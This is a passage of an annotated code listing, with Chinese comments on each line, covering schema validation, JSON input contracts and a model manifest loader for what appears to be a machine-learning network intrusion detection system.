| 55 | 循环：逐个处理集合或迭代器中的元素。 | `        for k, v in nf.items():` |
| 56 | 条件判断：满足条件时进入对应分支。 | `            if k in ("schema_name", "schema_version", "schema"):` |
| 57 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 58 | 函数调用：执行已有函数/方法完成当前步骤。 | `            out.setdefault(k, v)` |
| 59 | 返回结果：把处理后的值交回调用方。 | `    return out` |
| 60 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 61 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 62 | 函数定义：声明 `validate_payload_against_schema` 的输入、处理逻辑和返回结果。 | `def validate_payload_against_schema(` |
| 63 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    schema_id: str,` |
| 64 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    payload: Mapping[str, Any],` |
| 65 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> Tuple[bool, List[str]]:` |
| 66 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 67 | 代码语句：参与当前文件的业务流程或数据处理。 | `    校验 payload 是否满足 schema 的 required_fields（禁止静默视为合规）。` |
| 68 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 69 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Returns:` |
| 70 | 函数调用：执行已有函数/方法完成当前步骤。 | `        (ok, reasons) — ok 为 False 时 reasons 为人类可读原因列表。` |
| 71 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 72 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    doc = _load_schema_doc(schema_id)` |
| 73 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    required: Mapping[str, Any] = doc.get("required_fields") or {}` |
| 74 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 75 | 条件判断：满足条件时进入对应分支。 | `    if schema_id == "web_request_v1":` |
| 76 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        flat = _flatten_web_features(payload)` |
| 77 | 条件分支：前面条件不满足时继续判断。 | `    elif schema_id == "network_flow_v1":` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        flat = _flatten_network_flow_features(payload)` |
| 79 | 兜底分支：处理前面条件都不满足的情况。 | `    else:` |
| 80 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        flat = dict(payload)` |
| 81 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 82 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    errors: List[str] = []` |
| 83 | 循环：逐个处理集合或迭代器中的元素。 | `    for field, spec in required.items():` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        policy = (spec or {}).get("policy", "forbid_silent_fill")` |
| 85 | 条件判断：满足条件时进入对应分支。 | `        if field not in flat:` |
| 86 | 函数调用：执行已有函数/方法完成当前步骤。 | `            errors.append(f"缺少必填字段 {field!r}（policy={policy}）")` |
| 87 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        val = flat[field]` |
| 89 | 条件判断：满足条件时进入对应分支。 | `        if val is None:` |
| 90 | 函数调用：执行已有函数/方法完成当前步骤。 | `            errors.append(f"必填字段 {field!r} 为 null（禁止静默填充）")` |
| 91 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 92 | 条件判断：满足条件时进入对应分支。 | `        if field.endswith("_ip") or spec.get("type") == "string":` |
| 93 | 条件判断：满足条件时进入对应分支。 | `            if isinstance(val, str) and val.strip() == "":` |
| 94 | 函数调用：执行已有函数/方法完成当前步骤。 | `                errors.append(f"必填字段 {field!r} 为空串（禁止静默填充）")` |
| 95 | 条件判断：满足条件时进入对应分支。 | `        if spec.get("type") == "number" and isinstance(val, str):` |
| 96 | 函数调用：执行已有函数/方法完成当前步骤。 | `            errors.append(f"必填字段 {field!r} 类型应为 number，实际为 str")` |
| 97 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 98 | 返回结果：把处理后的值交回调用方。 | `    return (len(errors) == 0, errors)` |
| 99 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 100 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 101 | 函数定义：声明 `attach_network_flow_v1_block` 的输入、处理逻辑和返回结果。 | `def attach_network_flow_v1_block(feat: MutableMapping[str, Any]) -> None:` |
| 102 | 文档字符串：说明当前模块、类或函数的职责。 | `    """在流特征字典上附加 \`\`network_flow_v1\`\` 契约块（就地修改）。"""` |
| 103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    keys = [` |
| 104 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "src_ip",` |
| 105 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "dst_ip",` |
| 106 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "src_port",` |
| 107 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "dst_port",` |
| 108 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "protocol",` |
| 109 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "packet_count",` |
| 110 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "byte_count",` |
| 111 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "flow_pkt_count",` |
| 112 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "flow_byte_count",` |
| 113 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "flow_duration",` |
| 114 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "flow_pkt_rate",` |
| 115 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "flow_byte_rate",` |
| 116 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "window_unique_dst_ip",` |
| 117 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "window_unique_dst_port",` |
| 118 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "window_protocol_dist",` |
| 119 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "pkt_len_mean",` |
| 120 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "pkt_len_std",` |
| 121 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "pkt_len_max",` |
| 122 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "pkt_len_min",` |
| 123 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "syn_count",` |
| 124 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "ack_count",` |
| 125 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "fin_count",` |
| 126 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "rst_count",` |
| 127 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "flow_low_confidence",` |
| 128 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ]` |
| 129 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    block: Dict[str, Any] = {"schema_name": "network_flow_v1", "schema_version": "1"}` |
| 130 | 循环：逐个处理集合或迭代器中的元素。 | `    for k in keys:` |
| 131 | 条件判断：满足条件时进入对应分支。 | `        if k in feat:` |
| 132 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            block[k] = feat[k]` |
| 133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    feat["network_flow_v1"] = block` |
| 134 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 135 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 136 | 函数定义：声明 `production_tabular_keys_present` 的输入、处理逻辑和返回结果。 | `def production_tabular_keys_present(` |
| 137 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    feature_columns: List[str],` |
| 138 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    features: Mapping[str, Any],` |
| 139 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> Tuple[bool, List[str]]:` |
| 140 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 141 | 代码语句：参与当前文件的业务流程或数据处理。 | `    生产可信 tabular 推理：\`\`feature_columns\`\` 每个键必须出现在 features 中且值非 None。` |
| 142 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 143 | 代码语句：参与当前文件的业务流程或数据处理。 | `    禁止用 0 填充缺失键冒充合规。` |
| 144 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 145 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    flat = _flatten_network_flow_features(features)` |
| 146 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    missing: List[str] = []` |
| 147 | 循环：逐个处理集合或迭代器中的元素。 | `    for col in feature_columns:` |
| 148 | 条件判断：满足条件时进入对应分支。 | `        if col not in flat:` |
| 149 | 函数调用：执行已有函数/方法完成当前步骤。 | `            missing.append(col)` |
| 150 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 151 | 条件判断：满足条件时进入对应分支。 | `        if flat[col] is None:` |
| 152 | 函数调用：执行已有函数/方法完成当前步骤。 | `            missing.append(f"{col}(null)")` |
| 153 | 返回结果：把处理后的值交回调用方。 | `    return (len(missing) == 0, missing)` |

## `src/schema/inference_guard.py`

- 类型：数据结构/Schema
- 行数：28

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""ML 推理降级结果构造（统一写入 raw_data 供融合/审计）。"""` |
| 2 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Dict, Optional` |
| 5 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 6 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.base import DetectionResult` |
| 7 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 8 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 9 | 函数定义：声明 `ml_degraded_normal` 的输入、处理逻辑和返回结果。 | `def ml_degraded_normal(` |
| 10 | 代码语句：参与当前文件的业务流程或数据处理。 | `    *,` |
| 11 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    engine: str,` |
| 12 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    reason: str,` |
| 13 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    source_ip: str = "",` |
| 14 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    extra: Optional[Dict[str, Any]] = None,` |
| 15 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> DetectionResult:` |
| 16 | 返回结果：把处理后的值交回调用方。 | `    return DetectionResult(` |
| 17 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        threat_type="normal",` |
| 18 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        threat_level="low",` |
| 19 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        confidence=0.0,` |
| 20 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        details=f"{engine} ML 降级：{reason}",` |
| 21 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        source_ip=source_ip or "",` |
| 22 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        raw_data={` |
| 23 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "ml_degraded": True,` |
| 24 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "engine": engine,` |
| 25 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "reason": reason,` |
| 26 | 函数调用：执行已有函数/方法完成当前步骤。 | `            **(extra or {}),` |
| 27 | 代码语句：参与当前文件的业务流程或数据处理。 | `        },` |
| 28 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |

## `src/schema/json/ioc_match_v1.json`

- 类型：数据结构/Schema
- 行数：17

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | JSON 结构：组织对象或数组边界。 | `{` |
| 2 | JSON 字段：定义结构化数据的键值。 | `  "schema_name": "ioc_match_v1",` |
| 3 | JSON 字段：定义结构化数据的键值。 | `  "schema_version": "1",` |
| 4 | JSON 字段：定义结构化数据的键值。 | `  "description": "威胁情报命中上下文（IP / 域名 / 哈希 / CVE 等）。",` |
| 5 | JSON 字段：定义结构化数据的键值。 | `  "required_fields": {` |
| 6 | JSON 字段：定义结构化数据的键值。 | `    "ioc_type": {"type": "string", "policy": "forbid_silent_fill"},` |
| 7 | JSON 字段：定义结构化数据的键值。 | `    "ioc_value": {"type": "string", "policy": "forbid_silent_fill"},` |
| 8 | JSON 字段：定义结构化数据的键值。 | `    "observed_at": {"type": "string", "policy": "forbid_silent_fill"}` |
| 9 | JSON 结构：组织对象或数组边界。 | `  },` |
| 10 | JSON 字段：定义结构化数据的键值。 | `  "optional_fields": {` |
| 11 | JSON 字段：定义结构化数据的键值。 | `    "source_feed": {"type": "string", "policy": "optional"},` |
| 12 | JSON 字段：定义结构化数据的键值。 | `    "confidence": {"type": "number", "policy": "optional"},` |
| 13 | JSON 字段：定义结构化数据的键值。 | `    "related_ip": {"type": "string", "policy": "optional"},` |
| 14 | JSON 字段：定义结构化数据的键值。 | `    "cve_id": {"type": "string", "policy": "optional"},` |
| 15 | JSON 字段：定义结构化数据的键值。 | `    "ttl_sec": {"type": "number", "policy": "optional"}` |
| 16 | JSON 结构：组织对象或数组边界。 | `  }` |
| 17 | JSON 结构：组织对象或数组边界。 | `}` |

## `src/schema/json/network_flow_v1.json`

- 类型：数据结构/Schema
- 行数：33

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | JSON 结构：组织对象或数组边界。 | `{` |
| 2 | JSON 字段：定义结构化数据的键值。 | `  "schema_name": "network_flow_v1",` |
| 3 | JSON 字段：定义结构化数据的键值。 | `  "schema_version": "1",` |
| 4 | JSON 字段：定义结构化数据的键值。 | `  "description": "在线流 / 窗口聚合特征契约；与 NSL-KDD 41 维无直接一一对应。",` |
| 5 | JSON 字段：定义结构化数据的键值。 | `  "required_fields": {` |
| 6 | JSON 字段：定义结构化数据的键值。 | `    "src_ip": {"type": "string", "policy": "forbid_silent_fill"},` |
| 7 | JSON 字段：定义结构化数据的键值。 | `    "protocol": {"type": "string", "policy": "forbid_silent_fill"},` |
| 8 | JSON 字段：定义结构化数据的键值。 | `    "flow_pkt_count": {"type": "number", "policy": "forbid_silent_fill"},` |
| 9 | JSON 字段：定义结构化数据的键值。 | `    "flow_byte_count": {"type": "number", "policy": "forbid_silent_fill"}` |
| 10 | JSON 结构：组织对象或数组边界。 | `  },` |
| 11 | JSON 字段：定义结构化数据的键值。 | `  "optional_fields": {` |
| 12 | JSON 字段：定义结构化数据的键值。 | `    "dst_ip": {"type": "string", "policy": "optional"},` |
| 13 | JSON 字段：定义结构化数据的键值。 | `    "src_port": {"type": "number", "policy": "optional"},` |
| 14 | JSON 字段：定义结构化数据的键值。 | `    "dst_port": {"type": "number", "policy": "optional"},` |
| 15 | JSON 字段：定义结构化数据的键值。 | `    "packet_count": {"type": "number", "policy": "optional"},` |
| 16 | JSON 字段：定义结构化数据的键值。 | `    "byte_count": {"type": "number", "policy": "optional"},` |
| 17 | JSON 字段：定义结构化数据的键值。 | `    "flow_duration": {"type": "number", "policy": "optional"},` |
| 18 | JSON 字段：定义结构化数据的键值。 | `    "flow_pkt_rate": {"type": "number", "policy": "optional"},` |
| 19 | JSON 字段：定义结构化数据的键值。 | `    "flow_byte_rate": {"type": "number", "policy": "optional"},` |
| 20 | JSON 字段：定义结构化数据的键值。 | `    "window_unique_dst_ip": {"type": "number", "policy": "optional"},` |
| 21 | JSON 字段：定义结构化数据的键值。 | `    "window_unique_dst_port": {"type": "number", "policy": "optional"},` |
| 22 | JSON 字段：定义结构化数据的键值。 | `    "window_protocol_dist": {"type": "object", "policy": "optional"},` |
| 23 | JSON 字段：定义结构化数据的键值。 | `    "pkt_len_mean": {"type": "number", "policy": "optional"},` |
| 24 | JSON 字段：定义结构化数据的键值。 | `    "pkt_len_std": {"type": "number", "policy": "optional"},` |
| 25 | JSON 字段：定义结构化数据的键值。 | `    "pkt_len_max": {"type": "number", "policy": "optional"},` |
| 26 | JSON 字段：定义结构化数据的键值。 | `    "pkt_len_min": {"type": "number", "policy": "optional"},` |
| 27 | JSON 字段：定义结构化数据的键值。 | `    "syn_count": {"type": "number", "policy": "optional"},` |
| 28 | JSON 字段：定义结构化数据的键值。 | `    "ack_count": {"type": "number", "policy": "optional"},` |
| 29 | JSON 字段：定义结构化数据的键值。 | `    "fin_count": {"type": "number", "policy": "optional"},` |
| 30 | JSON 字段：定义结构化数据的键值。 | `    "rst_count": {"type": "number", "policy": "optional"},` |
| 31 | JSON 字段：定义结构化数据的键值。 | `    "flow_low_confidence": {"type": "boolean", "policy": "optional"}` |
| 32 | JSON 结构：组织对象或数组边界。 | `  }` |
| 33 | JSON 结构：组织对象或数组边界。 | `}` |

## `src/schema/json/system_behavior_v1.json`

- 类型：数据结构/Schema
- 行数：17

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | JSON 结构：组织对象或数组边界。 | `{` |
| 2 | JSON 字段：定义结构化数据的键值。 | `  "schema_name": "system_behavior_v1",` |
| 3 | JSON 字段：定义结构化数据的键值。 | `  "schema_version": "1",` |
| 4 | JSON 字段：定义结构化数据的键值。 | `  "description": "系统 / 用户行为异常检测输入契约（预留，与登录、进程、权限日志对齐）。",` |
| 5 | JSON 字段：定义结构化数据的键值。 | `  "required_fields": {` |
| 6 | JSON 字段：定义结构化数据的键值。 | `    "host_id": {"type": "string", "policy": "forbid_silent_fill"},` |
| 7 | JSON 字段：定义结构化数据的键值。 | `    "event_time": {"type": "string", "policy": "forbid_silent_fill"},` |
| 8 | JSON 字段：定义结构化数据的键值。 | `    "event_type": {"type": "string", "policy": "forbid_silent_fill"}` |
| 9 | JSON 结构：组织对象或数组边界。 | `  },` |
| 10 | JSON 字段：定义结构化数据的键值。 | `  "optional_fields": {` |
| 11 | JSON 字段：定义结构化数据的键值。 | `    "user": {"type": "string", "policy": "optional"},` |
| 12 | JSON 字段：定义结构化数据的键值。 | `    "process_name": {"type": "string", "policy": "optional"},` |
| 13 | JSON 字段：定义结构化数据的键值。 | `    "pid": {"type": "number", "policy": "optional"},` |
| 14 | JSON 字段：定义结构化数据的键值。 | `    "severity_hint": {"type": "string", "policy": "optional"},` |
| 15 | JSON 字段：定义结构化数据的键值。 | `    "raw_message": {"type": "string", "policy": "optional"}` |
| 16 | JSON 结构：组织对象或数组边界。 | `  }` |
| 17 | JSON 结构：组织对象或数组边界。 | `}` |

## `src/schema/json/web_request_v1.json`

- 类型：数据结构/Schema
- 行数：18

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | JSON 结构：组织对象或数组边界。 | `{` |
| 2 | JSON 字段：定义结构化数据的键值。 | `  "schema_name": "web_request_v1",` |
| 3 | JSON 字段：定义结构化数据的键值。 | `  "schema_version": "1",` |
| 4 | JSON 字段：定义结构化数据的键值。 | `  "description": "HTTP 日志 / Web 特征契约；告警链路需保留 src_ip。",` |
| 5 | JSON 字段：定义结构化数据的键值。 | `  "required_fields": {` |
| 6 | JSON 字段：定义结构化数据的键值。 | `    "src_ip": {"type": "string", "policy": "forbid_silent_fill"},` |
| 7 | JSON 字段：定义结构化数据的键值。 | `    "url": {"type": "string", "policy": "forbid_silent_fill"},` |
| 8 | JSON 字段：定义结构化数据的键值。 | `    "method": {"type": "string", "policy": "forbid_silent_fill"},` |
| 9 | JSON 字段：定义结构化数据的键值。 | `    "status_code": {"type": "number", "policy": "forbid_silent_fill"}` |
| 10 | JSON 结构：组织对象或数组边界。 | `  },` |
| 11 | JSON 字段：定义结构化数据的键值。 | `  "optional_fields": {` |
| 12 | JSON 字段：定义结构化数据的键值。 | `    "response_size": {"type": "number", "policy": "optional"},` |
| 13 | JSON 字段：定义结构化数据的键值。 | `    "user_agent": {"type": "string", "policy": "optional"},` |
| 14 | JSON 字段：定义结构化数据的键值。 | `    "timestamp": {"type": "string", "policy": "optional"},` |
| 15 | JSON 字段：定义结构化数据的键值。 | `    "decoded_url": {"type": "string", "policy": "optional"},` |
| 16 | JSON 字段：定义结构化数据的键值。 | `    "url_decoded": {"type": "string", "policy": "optional"}` |
| 17 | JSON 结构：组织对象或数组边界。 | `  }` |
| 18 | JSON 结构：组织对象或数组边界。 | `}` |

## `src/schema/manifest.py`

- 类型：数据结构/Schema
- 行数：259

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `model_manifest.json 规范与加载校验。` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `与模型同名的清单文件：\`\`{model_stem}.model_manifest.json\`\`（与 .pkl 同目录）。` |
| 5 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 6 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 7 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 8 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import json` |
| 9 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 10 | 导入对象：从指定模块引入类、函数或常量。 | `from dataclasses import dataclass, field` |
| 11 | 导入对象：从指定模块引入类、函数或常量。 | `from pathlib import Path` |
| 12 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Dict, List, Mapping, Optional` |
| 13 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 14 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `REQUIRED_MANIFEST_KEYS: tuple[str, ...] = (` |
| 15 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "model_name",` |
| 16 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "version",` |
| 17 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "schema_name",` |
| 18 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "schema_version",` |
| 19 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "feature_columns",` |
| 20 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "training_dataset",` |
| 21 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "metrics",` |
| 22 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "created_at",` |
| 23 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "artifact_files",` |
| 24 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 25 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 26 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `ALLOWED_TRUST_TIERS = frozenset({"production", "prototype_nsl_kdd"})` |
| 27 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `ALLOWED_INPUT_MODES = frozenset({"tabular", "text_sklearn_pipeline"})` |
| 28 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 29 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 30 | 类定义：声明 `ManifestLoadError`，封装相关状态与行为。 | `class ManifestLoadError(ValueError):` |
| 31 | 文档字符串：说明当前模块、类或函数的职责。 | `    """清单缺失、字段非法或与模型不一致。"""` |
| 32 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 33 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 34 | 装饰器：为下面的函数或类附加框架行为。 | `@dataclass` |
| 35 | 类定义：声明 `ModelManifest`，封装相关状态与行为。 | `class ModelManifest:` |
| 36 | 文档字符串：说明当前模块、类或函数的职责。 | `    """已校验的模型清单（可信边界元数据）。"""` |
| 37 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 38 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    model_name: str` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    version: str` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    schema_name: str` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    schema_version: str` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    feature_columns: List[str]` |
| 43 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    training_dataset: str` |
| 44 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    metrics: Dict[str, Any]` |
| 45 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    created_at: str` |
| 46 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    artifact_files: Dict[str, str]` |
| 47 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    trust_tier: str = "production"` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    adapter: Optional[str] = None` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    model_input_mode: str = "tabular"` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    raw: Dict[str, Any] = field(default_factory=dict)` |
| 51 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 52 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 53 | 函数定义：声明 `manifest_path_for_model_file` 的输入、处理逻辑和返回结果。 | `def manifest_path_for_model_file(model_path: str) -> str:` |
| 54 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    p = Path(os.path.abspath(model_path))` |
| 55 | 返回结果：把处理后的值交回调用方。 | `    return str(p.parent / f"{p.stem}.model_manifest.json")` |
| 56 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 57 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 58 | 函数定义：声明 `load_manifest_for_model_path` 的输入、处理逻辑和返回结果。 | `def load_manifest_for_model_path(model_path: str) -> ModelManifest:` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    mpath = manifest_path_for_model_file(model_path)` |
| 60 | 条件判断：满足条件时进入对应分支。 | `    if not os.path.isfile(mpath):` |
| 61 | 抛出异常：主动报告不可继续的错误。 | `        raise ManifestLoadError(f"缺少模型清单（拒绝静默上线）: {mpath}")` |
| 62 | 上下文管理：自动管理资源打开与释放。 | `    with open(mpath, encoding="utf-8") as f:` |
| 63 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        data = json.load(f)` |
| 64 | 返回结果：把处理后的值交回调用方。 | `    return validate_manifest_dict(data, model_path=model_path, manifest_path=mpath)` |
| 65 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 66 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 67 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `VERSION_MANIFEST_NAME = "manifest.json"` |
| 68 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 69 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 70 | 函数定义：声明 `_infer_primary_artifact_basename` 的输入、处理逻辑和返回结果。 | `def _infer_primary_artifact_basename(` |
| 71 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    data: Mapping[str, Any], version_dir: str` |
| 72 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> str:` |
| 73 | 文档字符串：说明当前模块、类或函数的职责。 | `    """从版本目录 \`\`manifest.json\`\` 解析主权重文件名（须与 artifact_files 一致）。"""` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    pa = data.get("primary_artifact")` |
| 75 | 条件判断：满足条件时进入对应分支。 | `    if isinstance(pa, str) and pa.strip():` |
| 76 | 返回结果：把处理后的值交回调用方。 | `        return os.path.basename(pa.strip().replace("\\", "/"))` |
| 77 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    arts = data.get("artifact_files")` |
| 79 | 条件判断：满足条件时进入对应分支。 | `    if not isinstance(arts, dict):` |
| 80 | 抛出异常：主动报告不可继续的错误。 | `        raise ManifestLoadError("artifact_files 非法")` |
| 81 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 82 | 循环：逐个处理集合或迭代器中的元素。 | `    for key in ("model", "primary", "weights", "pipeline"):` |
| 83 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rel = arts.get(key)` |
| 84 | 条件判断：满足条件时进入对应分支。 | `        if isinstance(rel, str) and rel and not rel.endswith(("/", "\\")):` |
| 85 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            base = os.path.basename(rel)` |
| 86 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ap = os.path.normpath(os.path.join(version_dir, rel))` |
| 87 | 条件判断：满足条件时进入对应分支。 | `            if os.path.isfile(ap):` |
| 88 | 返回结果：把处理后的值交回调用方。 | `                return base` |
| 89 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 90 | 循环：逐个处理集合或迭代器中的元素。 | `    for cand in ("model.pkl", "pipeline.pkl"):` |
